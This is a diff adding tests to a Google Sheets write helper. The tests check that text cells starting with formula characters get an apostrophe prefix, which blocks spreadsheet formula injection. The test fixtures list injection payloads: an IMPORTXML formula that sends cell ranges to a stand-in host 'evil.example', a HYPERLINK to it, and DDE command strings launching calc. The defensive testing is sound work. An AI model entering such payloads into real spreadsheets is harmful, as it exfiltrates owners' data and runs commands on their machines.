@@ -124,3 +124,42 @@ describe("writeSheet write-then-trim ordering", () => {
     expect(calls.some((c) => c.method === "PUT")).toBe(true);
   });
 });
+
+
+/* Formula injection (found in the Sep 21 QA pass): every Sheet write uses
+   USER_ENTERED, so a cell whose text starts with = + - or @ is EXECUTED as a
+   formula. A student can type their own name at BVRIT self-registration, and
+   complaint text / expense notes are free text - =IMPORTXML("http://evil/?"&A1:F50, ...)
+   would read the owner's data and send it out when the Sheet is opened. Every
+   text cell is neutralised centrally, in the two functions all writes go through. */
+describe("Sheet writes neutralise formula injection", () => {
+  const evil = [
+    '=IMPORTXML("http://evil.example/?"&A1:F50,"//a")',
+    '=HYPERLINK("http://evil.example","click")',
+    "+cmd|' /C calc'!A0",
+    "@SUM(1+1)*cmd|' /C calc'!A0",
+    "-2+3+cmd|' /C calc'!A0",
+  ];
+  const putBody = () => JSON.parse(calls.find((c) => c.method === "PUT")!.body!).values as unknown[][];
+  const appendBody = () => JSON.parse(calls.find((c) => c.url.includes(":append"))!.body!).values as unknown[][];
+
+  it("writeSheet prefixes dangerous text with an apostrophe (shown as plain text)", async () => {
+    global.fetch = mockFetch() as unknown as typeof fetch;
+    const { writeSheet } = await import("../lib/sheets");
+    await writeSheet("Test", [["Name"], ...evil.map((e) => [e])]);
+    const cells = putBody().slice(1).map((r) => r[0]);
+    cells.forEach((c, i) => expect(c, evil[i]).toBe("'" + evil[i]));
+  });
+  it("appendSheet does the same for event-log rows", async () => {
+    global.fetch = mockFetch() as unknown as typeof fetch;
+    const { appendSheet } = await import("../lib/sheets");
+    await appendSheet("Log", evil.map((e) => ["t", e, 5]));
+    appendBody().forEach((r, i) => { expect(r[1], evil[i]).toBe("'" + evil[i]); expect(r[2]).toBe(5); });
+  });
+  it("leaves normal values alone: numbers, negative numbers, text, phone (already prefixed), dashes", async () => {
+    global.fetch = mockFetch() as unknown as typeof fetch;
+    const { writeSheet } = await import("../lib/sheets");
+    await writeSheet("Test", [["a"], [5, -2.5, "-5", "+12", "Regular garment", "'+91 9876543210", "—", "", "2026-09-21 14:51", "#1015"]]);
+    expect(putBody()[1].slice(0, 10)).toEqual([5, -2.5, "-5", "+12", "Regular garment", "'+91 9876543210", "—", "", "2026-09-21 14:51", "#1015"]);
+  });
+});
